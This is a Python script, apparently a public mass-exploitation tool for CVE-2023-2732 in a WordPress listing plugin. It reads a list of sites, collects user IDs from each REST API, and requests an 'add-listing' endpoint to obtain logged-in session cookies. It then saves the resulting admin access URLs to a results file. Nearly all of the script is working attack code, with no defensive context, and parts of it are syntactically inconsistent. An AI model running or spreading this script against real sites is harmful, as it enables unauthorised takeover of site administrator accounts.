import requests
import time
import re
import random
import os
import sys
import json
import threading
from colorama import Fore, Style, init
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)

r = Fore.RED + Style.BRIGHT
g = Fore.GREEN + Style.BRIGHT
c = Fore.CYAN + Style.BRIGHT
y = Fore.YELLOW + Style.BRIGHT
o = Fore.RESET + Style.RESET_ALL

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
}

def GET_USER_ID(url):
    try:
        if not url.startswith("http") and not url.startswith("https"):
            url = "https://" + url
        
        resp = requests.get(url + '/wp-json/wp/v2/users', headers=headers, timeout=10, verify=False)
        if resp.ok and '"slug":"' in resp.content:
            users = json.loads(resp.content)
            hah = users[0]['id']
            resp2 = requests.get(url + '/wp-json/wp/v2/add-listing?id='+str(hah), headers=headers, timeout=10, verify=False).cookies
            cookies = requests.utils.dict_from_cookiejar(resp2)
            if any(cookie.startswith('wordpress_logged_in_') for cookie in cookies):
                print(y + 'Visit the following URL : ' +g+' '+ url + '/wp-json/wp/v2/add-listing?id='+str(hah)+o)
                print(y + 'Visit : '+' ' +g+ +url+'/wp-admin/'+o)
                open('results.txt','a').write('Visit Url : '+' ' + url + '/wp-json/wp/v2/add-listing?id='+str(hah)+'\n\n'+'Visit' + ':' +' ' + url+'/wp-admin/'+'\n')
            else:
                print("{}{} ==> Not Vuln.".format(r, url))
    except requests.exceptions.RequestException:
        pass

def process_urls(urls):
    for url in urls:
        GET_USER_ID(url)

if __name__ == '__main__':
    os.system('cls' if os.name == 'nt' else 'clear')
    print "{} CVE-2023-2732  | {}Shin Code\n".format(y, c)
    url_list = open(raw_input('List:~# '), 'r').read().splitlines()
    num_threads = 100
    chunked_urls = [url_list[i:i+num_threads] for i in range(0, len(url_list), num_threads)]
    
    for urls in chunked_urls:
        process_urls(urls)
